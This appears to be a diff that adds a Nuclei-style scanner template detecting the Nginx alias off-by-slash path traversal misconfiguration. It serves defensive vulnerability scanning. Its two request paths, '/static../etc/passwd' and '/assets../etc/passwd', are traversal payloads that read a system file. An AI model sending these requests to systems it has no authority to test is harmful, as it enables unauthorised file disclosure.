@@ -1,0 +1,22 @@
+id: whai-nginx-off-by-slash
+
+info:
+  name: Nginx Off-By-Slash Path Traversal
+  author: whitehat-ai
+  severity: high
+  description: Tests for Nginx alias misconfiguration
+  tags: nginx,misconfig,path-traversal,high
+  classification:
+    cwe-id: CWE-22
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/static../etc/passwd"
+      - "{{BaseURL}}/assets../etc/passwd"
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
